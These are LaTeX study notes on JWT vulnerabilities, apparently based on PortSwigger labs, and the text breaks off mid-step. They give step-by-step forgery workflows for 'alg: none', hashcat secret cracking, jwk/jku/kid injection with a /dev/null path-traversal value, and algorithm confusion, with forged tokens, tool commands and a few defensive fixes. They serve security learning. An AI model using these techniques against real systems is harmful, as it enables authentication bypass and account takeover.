\documentclass{article}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{url}
\usepackage{graphicx}
\usepackage{geometry}
\usepackage{listings}
\usepackage{hyperref}
\usepackage{multicol}
\usepackage{xcolor}
\usepackage{tcolorbox}
\usepackage{enumitem}


\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}

% Configure listings for JSON and JWT display
\lstset{
    numbers=none,
    basicstyle=\ttfamily\small,
    breaklines=true,
    frame=single,
    backgroundcolor=\color{gray!10},
    keywordstyle=\color{blue},
    commentstyle=\color{green!60!black},
    stringstyle=\color{red}
}

\renewcommand{\lstlistingname}{Listing}

% Custom box for important notes
\newtcolorbox{notebox}[1][]{
    colback=yellow!10,
    colframe=black!20,
    fonttitle=\bfseries,
    title=#1
}

\newtcolorbox{attackbox}[1][]{
    colback=red!5,
    colframe=red!40!black,
    fonttitle=\bfseries,
    title=#1
}

\title{JWT Security Notes: Understanding and Exploiting JWT Vulnerabilities}
\author{Eyad Islam El-Taher}
\date{\today}

\begin{document}

\maketitle


\tableofcontents
\newpage

\section*{Introduction}
\addcontentsline{toc}{section}{Introduction}

JSON Web Tokens (JWTs) are a standardized format for sending cryptographically signed 
JSON data between systems. They can theoretically contain any kind of data, but are most 
commonly used to send information ("claims") about users as part of authentication, 
session handling, and access control mechanisms.

Unlike classic session tokens, all of the data that a server needs is stored client-side 
within the JWT itself. This makes JWTs a popular choice for highly distributed websites 
where users need to interact seamlessly with multiple back-end servers.

\section{JWT Structure and Format}

A JWT consists of three parts: a header, a payload, and a signature. These are each 
separated by a dot, as shown in the following example:

\begin{lstlisting}[caption=Example JWT Token]
  eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.
  eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhI
  iwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1
  vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw
  6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alS
  CZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYX
  pGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQ
  iBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
\end{lstlisting}

\subsection{Header}

The header is a base64url-encoded JSON object containing metadata about the token itself:

\begin{itemize}
    \item \textbf{typ}: Token type (typically "JWT")
    \item \textbf{alg}: Signing algorithm used (e.g., HS256, RS256)
    \item \textbf{kid}: Key ID (optional, used to identify the signing key)
\end{itemize}

\subsection{Payload}

The payload contains the actual "claims" about the user. Decoding the payload from the 
example token above reveals:

\begin{lstlisting}[caption=Decoded JWT Payload]
{
    "iss": "portswigger",
    "exp": 1648037164,
    "name": "Carlos Montoya",
    "sub": "carlos",
    "role": "blog_author",
    "email": "carlos@carlos-montoya.net",
    "iat": 1516239022
}
\end{lstlisting}

\begin{notebox}[Important Note]
In most cases, the header and payload data can be easily read or modified by anyone 
with access to the token. Therefore, the security of any JWT-based mechanism is heavily 
reliant on the cryptographic signature.
\end{notebox}

\subsection{Signature}

The server that issues the token typically generates the signature by hashing the header 
and payload. In some cases, they also encrypt the resulting hash. This process involves 
a secret signing key and provides a way for servers to verify that none of the data 
within the token has been tampered with since it was issued:

\begin{itemize}
    \item As the signature is directly derived from the rest of the token, changing a 
          single byte of the header or payload results in a mismatched signature.
    \item Without knowing the server's secret signing key, it shouldn't be possible to 
          generate the correct signature for a given header or payload.
\end{itemize}

\begin{notebox}[Pro Tip]
If you want to gain a better understanding of how JWTs are constructed, you can use the 
debugger on \url{https://jwt.io} to experiment with arbitrary tokens.
\end{notebox}

\section{JWT vs JWS vs JWE}

The JWT specification is actually very limited. It only defines a format for representing 
information ("claims") as a JSON object that can be transferred between two parties. In 
practice, JWTs aren't really used as a standalone entity. The JWT spec is extended by 
both the JSON Web Signature (JWS) and JSON Web Encryption (JWE) specifications.

\subsection{Relationship Between JWT, JWS, and JWE}

\begin{itemize}
    \item \textbf{JWT (JSON Web Token)}: Base specification defining the claim format
    \item \textbf{JWS (JSON Web Signature)}: Extends JWT to add digital signatures or HMAC
    \item \textbf{JWE (JSON Web Encryption)}: Extends JWT to add encryption
\end{itemize}

\begin{notebox}[Note]
For simplicity, throughout these materials, "JWT" refers primarily to JWS tokens, 
although some of the vulnerabilities described may also apply to JWE tokens. When 
people use the term "JWT", they almost always mean a JWS token. JWEs are very similar, 
except that the actual contents of the token are encrypted rather than just encoded.
\end{notebox}

\section{Understanding JWT Attacks}

\subsection{What Are JWT Attacks?}

JWT attacks involve a user sending modified JWTs to the server in order to achieve a 
malicious goal. Typically, this goal is to bypass authentication and access controls 
by impersonating another user who has already been authenticated.

\subsection{Impact of JWT Attacks}

The impact of JWT attacks is usually severe. If an attacker is able to create their 
own valid tokens with arbitrary values, they may be able to escalate their own 
privileges or impersonate other users, taking full control of their accounts.

\subsection{How Do Vulnerabilities to JWT Attacks Arise?}

JWT vulnerabilities typically arise due to flawed JWT handling within the application 
itself. The various specifications related to JWTs are relatively flexible by design, 
allowing website developers to decide many implementation details for themselves. This 
can result in them accidentally introducing vulnerabilities even when using battle-hardened 
libraries.

These implementation flaws usually mean that the signature of the JWT is not verified 
properly. This enables an attacker to tamper with the values passed to the application 
via the token's payload. Even if the signature is robustly verified, whether it can truly 
be trusted relies heavily on the server's secret key remaining a secret. If this key is 
leaked in some way, or can be guessed or brute-forced, an attacker can generate a valid 
signature for any arbitrary token, compromising the entire mechanism.

\section{Exploiting Flawed Signature Verification}

\subsection{The Core Problem}

Servers don't store issued JWTs, making each token self-contained. Without proper signature 
verification, the server cannot detect if a token was modified.

\subsection{Attack Scenario}

Consider this JWT payload:
\begin{lstlisting}[caption=Vulnerable JWT Payload]
{
    "username": "carlos",
    "isAdmin": false
}
\end{lstlisting}

An attacker can modify:
\begin{itemize}
    \item \texttt{username} → impersonate other users
    \item \texttt{isAdmin} → privilege escalation
\end{itemize}

\subsection{Common Implementation Flaw}

JWT libraries offer two methods:
\begin{itemize}
    \item \texttt{verify()} - validates signature
    \item \texttt{decode()} - only decodes, no validation
\end{itemize}

\begin{attackbox}[Critical Flaw]
Developers sometimes use \texttt{decode()} instead of \texttt{verify()}, 
accepting arbitrary tokens with no signature validation.
\end{attackbox}

\section{Exploiting the \texttt{alg} Parameter}

\subsection{The Core Problem}

The JWT header contains an \texttt{alg} parameter that tells the server which algorithm was used to sign the token:

\begin{lstlisting}[caption=JWT Header]
{
    "alg": "HS256",
    "typ": "JWT"
}
\end{lstlisting}

\begin{attackbox}[Critical Design Flaw]
The server trusts user-controllable input (the \texttt{alg} value) from an unverified token to decide how to verify the token itself.
\end{attackbox}

\subsection{The "none" Algorithm Attack}

JWTs can be signed with different algorithms or left unsigned by setting:

\begin{lstlisting}[caption=Unsecured JWT Header]
{
    "alg": "none",
    "typ": "JWT"
}
\end{lstlisting}

\subsection{Attack Workflow}

\begin{enumerate}
    \item Attacker intercepts a valid JWT
    \item Modifies payload (e.g., sets \texttt{"admin": true})
    \item Changes header \texttt{alg} from \texttt{HS256} to \texttt{none}
    \item Removes signature part entirely
    \item Token format becomes: \texttt{HEADER.PAYLOAD.}
\end{enumerate}

\subsection{Example}

Original token:
\begin{verbatim}
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZXlhZCIsImFkbWluIjpmYWxzZX0.signature
\end{verbatim}

Modified token:
\begin{verbatim}
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiZXlhZCIsImFkbWluIjp0cnVlfQ.
\end{verbatim}

\subsection{Bypassing Filters}

Servers may try to block \texttt{alg: none}, but can be bypassed with:

\begin{itemize}
    \item Case variation: \texttt{"None"}, \texttt{"NONE"}, \texttt{"nOnE"}
    \item Whitespace: \texttt{"none "}
    \item Null byte: \texttt{"none\textbackslash u0000"}
    \item Unexpected encodings
\end{itemize}

\begin{notebox}[Important]
Even with \texttt{alg: none}, the payload must be terminated with a trailing dot.
\end{notebox}

\subsection{Why Modern Libraries Are Safe}

Good JWT libraries protect against these attacks by:

\begin{itemize}
    \item Rejecting the \texttt{"none"} algorithm completely
    \item Requiring developers to explicitly specify allowed algorithms
    \item Never auto-trusting values from the token header
\end{itemize}

\subsection{Secure Implementation}

\begin{lstlisting}[caption=Secure JWT Verification]
// UNSAFE - trusts token header
jwt.decode(token, secret)

// SAFE - explicitly specifies algorithm
jwt.decode(token, secret, algorithms=["HS256"])
\end{lstlisting}

\section{Brute-Forcing Secret Keys}

\subsection{The Vulnerability}

Some algorithms (like HS256) use a standalone string as the secret key. If this key is weak or guessable, attackers can brute-force it and forge arbitrary tokens.

\subsection{Using Hashcat}

Hashcat can brute-force JWT secrets using mode 16500:

\begin{lstlisting}[caption=Hashcat Command]
hashcat -a 0 -m 16500 <jwt> <wordlist>
\end{lstlisting}

If a secret is found, hashcat outputs:
\begin{verbatim}
<jwt>:<identified-secret>
\end{verbatim}

\begin{notebox}[Note]
Use the \texttt{--show} flag to output results again on subsequent runs.
\end{notebox}

\subsection{Practical Attack Workflow}

\begin{enumerate}
    \item \textbf{Obtain} a valid JWT from the target
    \item \textbf{Brute-force} the secret using hashcat
    \item \textbf{Base64 encode} the discovered secret
    \item \textbf{Create} a new symmetric key in JWT Editor with the encoded secret
    \item \textbf{Modify} the JWT payload (e.g., change \texttt{sub} to \texttt{administrator})
    \item \textbf{Sign} the modified token with the cracked key
    \item \textbf{Send} the forged token to access restricted endpoints
\end{enumerate}

\section{JWT Header Parameter Injections}

\subsection{Attack-Relevant Header Parameters}

Beyond the mandatory \texttt{alg}, these headers are particularly useful to attackers:

\begin{itemize}
    \item \textbf{\texttt{jwk}} (JSON Web Key) - Embeds the public key directly in the token
    \item \textbf{\texttt{jku}} (JSON Web Key Set URL) - URL to fetch a key set containing the verification key
    \item \textbf{\texttt{kid}} (Key ID) - Identifier used by the server to select the correct key
\end{itemize}

These user-controllable parameters tell the server which key to use when verifying the signature.

\subsection{Injecting Self-Signed JWTs via \texttt{jwk}}

\subsubsection{How It Works}

The \texttt{jwk} parameter allows servers to embed public keys directly in the token:

\begin{lstlisting}[caption=JWT Header with Embedded JWK]
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
\end{lstlisting}

\subsubsection{The Vulnerability}

Ideally, servers should only use a limited whitelist of public keys. However, misconfigured servers sometimes use any key embedded in the \texttt{jwk} parameter.

\subsubsection{Attack Steps - Manual}

\begin{enumerate}
    \item Generate your own RSA key pair (private + public)
    \item Modify the JWT payload (e.g., change \texttt{sub} or \texttt{admin})
    \item Sign the modified token with your private key
    \item Embed the matching public key in the \texttt{jwk} header
    \item Update the \texttt{kid} header to match the embedded key's \texttt{kid}
\end{enumerate}

\subsubsection{Attack Steps - Using JWT Editor}

\begin{enumerate}
    \item In Burp's main tab bar, go to the \textbf{JWT Editor Keys} tab
    \item Click \textbf{New RSA Key}
    \item In the dialog, click \textbf{Generate} to automatically create a new key pair
    \item Click \textbf{OK} to save the key (key size is auto-selected)
    \item Send a request containing a JWT to Burp Repeater
    \item Switch to the \textbf{JSON Web Token} tab in the message editor
    \item Modify the token's payload as desired (sub to admin)
    \item Click \textbf{Attack} → \textbf{Embedded JWK}
    \item Select your newly generated RSA key when prompted
    \item Send the request to test the server response
\end{enumerate}

\begin{attackbox}[Key Concept]
The extension's built-in attack automatically handles updating the \texttt{kid} header to match the embedded key.
\end{attackbox}

\begin{notebox}[Public vs Private Keys]
- \textbf{Private key}: Used by you to sign the token (kept secret)
- \textbf{Public key}: Embedded in \texttt{jwk} for server verification (sent with token)
\end{notebox}

\subsection{Injecting Self-Signed JWTs via \texttt{jku}}

\subsubsection{How It Works}

Instead of embedding the public key directly, the \texttt{jku} (JWK Set URL) header parameter tells the server where to fetch a JWK Set containing the verification key.

\begin{lstlisting}[caption=JWK Set Format]
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67W
                hsN3JvaFYw-fhvsWQ"
        }
    ]
}
\end{lstlisting}

\subsubsection{The Vulnerability}

Servers may fetch keys from untrusted URLs if they fail to validate the domain properly.

\subsubsection{Practical Example: PortSwigger Lab}

\textbf{Target:} JWT-based session handling with \texttt{jku} support but no domain validation.

\textbf{Step 1:} Original JWT
\begin{verbatim}
eyJraWQiOiIzYWZiMjYxMC1lYmM2LTQ5ODctOTg3YS01M2ZiNTczYTBkNTYiLCJhbGciOiJSUzI1NiJ9.
eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUwNDI3Miwic3ViIjoid2llbmVyIn0.
5Q8g9OnQ6MzkDZdxy9Li1zVW1DHOGBjT1oJ7zCleLgXpKJR_fenJK97fZCUBGTaNZ1U46cnHaqjKh7Wei
gnVFu7IHmoPOEoas-8R8MkD5R-FPRX9oiCj6BI-XYoLokBV3ipPRczXnADfuAXH60g0up5U8CgmUT--q6gNfXJOvKxk7No
CtEJ08dFYaQFHQnjKLdroKbZzf3ETDXxSZ7FJrJRHvjet2pzxzqJiqEdVK75B3fdjiJMzfBHHFfLm6f
1SlHd6UJbFTRq-B3WqfMF3h0uMeYnUw1tLc-0feBCrd4zwpeyO4cc16-fYNlKlf70ly9mOg8SY-tcX7M6eKe8Cow
\end{verbatim}

\textbf{Step 2:} Use JWT Tool to forge token
\begin{lstlisting}[caption=JWT Tool Command]
jwt_tool <Original JWT> -X s -ju https://exploit-0a0c00a503071af581e6332f011600b2.exploit-server.net/exploit -T
\end{lstlisting}

\textbf{Step 3:} Modify parameters in interactive mode
\begin{itemize}
    \item Change \texttt{kid} to "jwt\_tool"
    \item Change \texttt{sub} from "wiener" to "administrator"
\end{itemize}

\textbf{Step 4:} JWKS file generated at:
\begin{verbatim}
/home/eyad/.jwt_tool/jwttool_custom_jwks.json
\end{verbatim}

\begin{lstlisting}[caption=Generated JWKS]
{
    "keys":[
        {
            "kty":"RSA",
            "kid":"jwt_tool",
            "use":"sig",
            "e":"AQAB",
            "n":"wDjc_fwZXtEHt5qkm49-so6NvLWBQUDL2EGPeCZMuGt5XXN0Q-ftaQyW4uUpBhi
            rkIQQ7SQe8_iotV_ZeYqB7Zkp1cT7t0S5w_EKAdJidChLs4ZzTu4a-1RgxUDXIsdvQNL
            Bkrbzk1dLs8YU43v2pmwmn9BhFV0hFQ7QqAueAQRguYgEH8wKB5civrteN1KK0rmz0Np
            Y9Eq1Uvno2YRHhSz6E2bV9p2Ca7CoxJe5an3HV3mtS-OxXARoKpw9AIQGVuAdh4_MiRN
            cBB_1l3I6b8BThDVEu-49zbHXhcVLtYcgQXkXQztHwAHFEvDyZFzVCnGFcv3HNJq3TEj
            N0Blx2Q"
        }
    ]
}
\end{lstlisting}

\textbf{Step 5:} Forged token with \texttt{jku} header:
\begin{verbatim}
eyJraWQiOiJqd3RfdG9vbCIsImFsZyI6IlJTMjU2Iiwiamt1IjoiaHR0cHM6Ly9leHBsb2l0LTBhMGMwMGE1MDMwNzFhZjU4MWU2MzMyZjAxMTYwMGIyLmV4cGxvaXQtc2VydmVyLm5ldC9leHBsb2l0In0.
eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUwNDI3Miwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
fHgaDhUOsYTDti91VlYo4SJ7KnEiNl3pHdHEknJ9RhPBELIUMAaBi8bSgpUkYCrsmWCo6fv4SuwCcJZMUvrbIm0WsfJCxX9_DQtDwQ6fDtTmvhNt8rBsXAlVCP8f821F7BJdnH36xEEHAkONrndZdW4l-G_ZBC2t57RGWgOuyeRwJmUesWLyjZ2kxdBe77psIquB9K93W7GtE-PntN98R4R4um3NNMhqGiNbH1mcyd31FfKC324bFlYPTEPP2kUmn9Qo2az025Fko1vtzNC7WpszsIqqUbz4mXCN8LrErOjNHscC_Skt1kcZfiGzpVYLnzARgxjqMPntfkJUADRhyQ
\end{verbatim}

\textbf{Step 6:} Host the JWKS at the exploit server URL and send the forged token to access \texttt{/admin} and delete the user.

\subsection{Injecting Self-Signed JWTs via \texttt{kid}}

\subsubsection{Understanding the \texttt{kid} Parameter}

The \texttt{kid} (Key ID) header parameter helps servers identify which key to use when verifying the signature. This is useful when multiple keys are in use.

\begin{lstlisting}[caption=JWT Header with kid]
{
    "kid": "key-123",
    "typ": "JWT",
    "alg": "HS256"
}
\end{lstlisting}

\subsubsection{The Critical Weakness}

The JWS specification doesn't define a concrete structure for \texttt{kid} - it's just an arbitrary string chosen by the developer. This flexibility creates danger:

\begin{itemize}
    \item Developers might use \texttt{kid} to point to database entries
    \item Or worse - use it as a file path to read the key from disk
\end{itemize}

\subsubsection{Path Traversal Attack}

If the server uses \texttt{kid} to construct a file path, an attacker can inject directory traversal sequences:

\begin{lstlisting}[caption=Malicious Header with Path Traversal]
{
    "kid": "../../../../../../../dev/null",
    "typ": "JWT",
    "alg": "HS256"
}
\end{lstlisting}

\subsubsection{Why \texttt{/dev/null} is Dangerous}

\begin{itemize}
    \item \texttt{/dev/null} exists on most Linux systems
    \item It's an empty file - reading it returns an empty string
    \item If the server uses the file contents as the verification key, the key becomes an empty string
    \item An attacker can then sign tokens with an empty string secret
\end{itemize}

\subsubsection{Practical Attack Steps}

\textbf{Step 1:} Create a symmetric key with null byte secret

\begin{enumerate}
    \item In Burp, go to \textbf{JWT Editor Keys} tab
    \item Click \textbf{New Symmetric Key}
    \item Click \textbf{Generate} to create a new key
    \item Replace the \texttt{k} property value with \textbf{AA==} (Base64-encoded null byte)
    \begin{verbatim}
    "k": "AA=="
    \end{verbatim}
    \item Click \textbf{OK} to save
\end{enumerate}

\begin{notebox}[Note]
The JWT Editor extension requires Base64-encoded values, so we use \texttt{AA==} as a workaround for the empty string.
\end{notebox}

\textbf{Step 2:} Modify the JWT

\begin{enumerate}
    \item Send a request with a JWT to Burp Repeater
    \item Switch to the \textbf{JSON Web Token} editor tab
    \item In the header, change \texttt{kid} to a path traversal pointing to \texttt{/dev/null}:
    \begin{verbatim}
    "kid": "../../../../../../../dev/null"
    \end{verbatim}
    \item In the payload, change \texttt{sub} to \texttt{administrator} (or any privileged user)
\end{enumerate}

\textbf{Step 3:} Sign the forged token

\begin{enumerate}
    \item Click \textbf{Sign} at the bottom of the tab
    \item Select the symmetric key you created (with \texttt{AA==} secret)
    \item Ensure \textbf{Don't modify header} is selected
    \item Click \textbf{OK}
\end{enumerate}

\subsubsection{How It Works}

\begin{attackbox}[Attack Chain]
1. Server reads \texttt{kid} = "../../../../../../../dev/null"
2. Server traverses filesystem to \texttt{/dev/null}
3. Server reads file contents → empty string
4. Server uses empty string as verification key
5. Server accepts token signed with empty string secret
6. Privilege escalation achieved (e.g., \texttt{sub: administrator})
\end{attackbox}

\subsubsection{Why This Is Dangerous}

\begin{itemize}
    \item The server trusts user input (\texttt{kid}) to locate its verification key
    \item No validation of what file is being read
    \item Predictable system files like \texttt{/dev/null} exist everywhere
    \item Results in complete bypass of signature verification
\end{itemize}

\subsubsection{Alternative Attack Vectors}

While \texttt{/dev/null} is the simplest, attackers could also target:
\begin{itemize}
    \item Known configuration files with predictable contents
    \item Files containing default or empty values
    \item Any file the web server has read access to
\end{itemize}

\section{Other Interesting JWT Header Parameters}

Beyond the commonly exploited parameters, two additional headers can open up new attack vectors.

\subsection{\texttt{cty} (Content Type)}

\subsubsection{Purpose}

The \texttt{cty} (Content Type) header parameter declares the media type of the content in the JWT payload. While usually omitted, underlying parsing libraries may still support it.

\subsubsection{Attack Potential}

If you've found a way to bypass signature verification, injecting a \texttt{cty} header can enable new attack vectors:

\begin{lstlisting}[caption=Injecting cty Header]
{
    "alg": "none",
    "typ": "JWT",
    "cty": "text/xml"
}
\end{lstlisting}

\begin{itemize}
    \item \textbf{text/xml} - Could enable XXE (XML External Entity) attacks if the payload is parsed as XML
    \item \textbf{application/x-java-serialized-object} - Could trigger deserialization vulnerabilities
\end{itemize}

\begin{attackbox}[Attack Chain]
Signature bypass + content type change = New attack surface
\end{attackbox}

\subsection{\texttt{x5c} (X.509 Certificate Chain)}

\subsubsection{Purpose}

The \texttt{x5c} header parameter is used to pass the X.509 public key certificate (or certificate chain) of the key used to sign the JWT.

\subsubsection{Attack Potential}

Similar to \texttt{jwk} injection, but using X.509 certificates:

\begin{lstlisting}[caption=x5c Header Example]
{
    "alg": "RS256",
    "typ": "JWT",
    "x5c": ["MIIE3jCCA8agAwIBAgICEAAwDQYJKoZIhvcNAQELBQAwgYQxCzAJBgNVBAYTAlVT..."],
    "x5t": "S8UdU5JqumxiJcHys7yY1v9PjOY"
}
\end{lstlisting}

\subsubsection{Attack Vectors}

\begin{enumerate}
    \item \textbf{Certificate Injection} - Embed a self-signed certificate to trick the server into accepting your own signing key
    \item \textbf{Parsing Vulnerabilities} - X.509 certificate parsing is complex and error-prone, leading to CVEs:
    \begin{itemize}
        \item \textbf{CVE-2017-2800} - Node.js JWS implementation vulnerability
        \item \textbf{CVE-2018-2633} - Oracle Java JWT parsing issue
    \end{itemize}
\end{enumerate}

\subsection{Summary of Attackable Header Parameters}

\begin{tabular}{|l|l|}
\hline
\textbf{Parameter} & \textbf{Attack Vector} \\
\hline
\texttt{jwk} & Embed your own public key \\
\texttt{jku} & Host your own JWKS and point to it \\
\texttt{kid} & Path traversal to force key selection \\
\texttt{cty} & Change content type for XXE/deserialization \\
\texttt{x5c} & Inject self-signed certificates \\
\hline
\end{tabular}

\begin{notebox}[Key Takeaway]
Any user-controllable header parameter that influences key selection or content handling is a potential attack surface. Always validate and whitelist expected values.
\end{notebox}

\section{Symmetric vs Asymmetric Algorithms}

\subsection{Symmetric Algorithms (e.g., HS256)}

\begin{itemize}
    \item Use a \textbf{single key} for both signing and verification
    \item The key must be kept secret, like a password
    \item Example: HS256 (HMAC + SHA-256)
\end{itemize}

\subsection{Asymmetric Algorithms (e.g., RS256)}

\begin{itemize}
    \item Use a \textbf{key pair}: private key and public key
    \item \textbf{Private key}: Used by server to sign tokens (kept secret)
    \item \textbf{Public key}: Used by anyone to verify signatures (often shared)
    \item Example: RS256 (RSA + SHA-256)
\end{itemize}

\section{Algorithm Confusion Vulnerabilities}

\subsection{How Vulnerabilities Arise}

Many JWT libraries provide a single, algorithm-agnostic method for verification:

\begin{lstlisting}[caption=Pseudo-code of Vulnerable Library]
function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
        // Use the provided key as an RSA public key
    } else if (algorithm == "HS256"){
        // Use the provided key as an HMAC secret key
    }
}
\end{lstlisting}

\subsection{The Flawed Assumption}

Developers often assume the method will only handle asymmetric algorithms:

\begin{lstlisting}[caption=Vulnerable Implementation]
publicKey = <public-key-of-server>;
token = request.getCookie("session");
verify(token, publicKey);  // Always passes the public key
\end{lstlisting}

\begin{attackbox}[The Critical Flaw]
If an attacker sends a token with \texttt{alg: HS256}, the library treats the RSA public key as an HMAC secret key.
\end{attackbox}

\subsection{Algorithm Confusion Attack Steps}

\subsubsection{Step 1: Obtain the Server's Public Key}

Servers often expose public keys via standard endpoints:
\begin{itemize}
    \item \texttt{/jwks.json}
    \item \texttt{/.well-known/jwks.json}
\end{itemize}
Even if the key isn't exposed publicly, you may be able to extract it from a pair of existing JWTs.

\begin{lstlisting}[caption=JWK Set Response]
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        }
    ]
}
\end{lstlisting}

\subsubsection{Step 2: Convert Public Key to Suitable Format}

The key you use must match the server's copy EXACTLY (every byte, including non-printing characters).

\textbf{Using JWT Editor Extension:}

\begin{enumerate}
    \item Go to \textbf{JWT Editor Keys} tab
    \item Click \textbf{New RSA Key} and paste the JWK
    \item Select \textbf{PEM} radio button and copy the PEM key
    \item Go to \textbf{Decoder} tab and Base64-encode the PEM
    \item Go back to \textbf{JWT Editor Keys} tab
    \item Click \textbf{New Symmetric Key} → \textbf{Generate}
    \item Replace the \texttt{k} parameter with your Base64-encoded PEM
    \item Save the key
\end{enumerate}

\begin{lstlisting}[caption=Symmetric Key with Public Key as Secret]
{
    "kty": "oct",
    "kid": "018c36ae-4bea-45c9-b4f1-7fb93c3312b3",
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFvK3l5MXdwWW1mZmdYQnhoQVVKegpISG9jQ3VKb2x3RHFxbDc1Wld1Q1EvY2IzMksydmg5bWs2R1BNOWdOTjRZL3FUVlg2N1doc04zSnZhRll3K2ZoCnZzV1EuLi4KLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
}
\end{lstlisting}

\subsubsection{Step 3: Modify the JWT}

\begin{enumerate}
    \item Change \texttt{alg} header from \texttt{RS256} to \texttt{HS256}
    \item Modify payload claims (e.g., \texttt{sub: administrator})
\end{enumerate}

\begin{lstlisting}[caption=Modified JWT Header]
{
    "alg": "HS256",
    "typ": "JWT",
    "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab"
}
\end{lstlisting}

\subsubsection{Step 4: Sign with the Public Key}

\begin{enumerate}
    \item In the \textbf{JSON Web Token} tab, click \textbf{Sign}
    \item Select the symmetric key you created
    \item Ensure \textbf{Don't modify header} is selected
    \item Click \textbf{OK}
\end{enumerate}

\subsection{Why This Works}

\begin{attackbox}[Attack Mechanics]
1. Server exposes RSA public key via /jwks.json
2. Attacker creates token with alg: HS256
3. Attacker signs token using the public key as HMAC secret
4. Server receives token, sees alg: HS256
5. Server uses the same public key as HMAC secret for verification
6. Signature matches → token accepted
7. Privilege escalation achieved
\end{attackbox}

\begin{notebox}[Critical Success Factors]
\begin{itemize}
    \item The public key used for signing must match the server's key exactly (same format, same bytes)
    \item The server must be using a vulnerable JWT library
    \item The server must not restrict which algorithms are allowed
\end{itemize}
\end{notebox}

\section{Deriving Public Keys from Existing Tokens}

\subsection{The Challenge}

Sometimes the server doesn't expose its public key via \texttt{/jwks.json}. In this case, you can still perform algorithm confusion attacks by deriving the key from multiple JWTs.

\subsection{Using sig2n Tools}

Two options are available:
\begin{itemize}
    \item \textbf{jwt\_forgery.py} - from the rsa\_sign2n GitHub repository
    \item \textbf{PortSwigger's Docker image} - Simplified version (recommended)
\end{itemize}

\subsection{Docker Command}

\begin{lstlisting}[caption=Running sig2n with Docker]
docker run --rm -it portswigger/sig2n <token1> <token2>
\end{lstlisting}

\begin{notebox}[First Run]
The first time you run this command, it will automatically pull the image from Docker Hub, which may take a few minutes.
\end{notebox}

\subsection{How It Works}

The tool uses two valid JWTs from the server to calculate potential values of \texttt{n} (the RSA modulus). For each potential value, it outputs:

\begin{itemize}
    \item A Base64-encoded PEM key in both \textbf{X.509} and \textbf{PKCS1} formats
    \item A forged JWT signed using each key
\end{itemize}

\subsection{Practical Attack Steps}

\subsubsection{Step 1: Collect Two Valid JWTs}

\begin{enumerate}
    \item Log in to your account and capture the JWT session cookie
    \item Log out and log in again to get a second JWT
    \item Save both tokens for later use
\end{enumerate}

\subsubsection{Step 2: Run the Tool}

\begin{lstlisting}[caption=Example Command]
docker run --rm -it portswigger/sig2n eyJhbGciOiJSUzI1NiJ9.eyJpc3Mi... eyJhbGciOiJSUzI1NiJ9.eyJpc3Mi...
\end{lstlisting}

The output contains:
\begin{itemize}
    \item Multiple mathematically possible \texttt{n} values
    \item Only ONE matches the server's actual key
    \item Each comes with Base64-encoded keys and forged JWTs
\end{itemize}

\subsubsection{Step 3: Identify the Correct Key}

\begin{enumerate}
    \item Copy the tampered JWT from the first \textbf{X.509} entry
    \item In Burp Repeater, replace your session cookie with this JWT
    \item Send a request to an endpoint (e.g., \texttt{/my-account})
\end{enumerate}

\begin{attackbox}[Identifying the Correct Key]
\begin{itemize}
    \item \textbf{200 OK} response --> This is the correct X.509 key 
    \item \textbf{302 Redirect} to login --> Wrong key 
\end{itemize}
If incorrect, repeat with the next X.509 key from the output.
\end{attackbox}

\subsubsection{Step 4: Create a Symmetric Key in JWT Editor}

Once you've identified the correct key:

\begin{enumerate}
    \item From the terminal, copy the \textbf{Base64-encoded X.509 key} (not the tampered JWT)
    \item In Burp, go to \textbf{JWT Editor Keys} tab
    \item Click \textbf{New Symmetric Key} → \textbf{Generate}
    \item Replace the \texttt{k} property value with the Base64-encoded key
    \begin{verbatim}
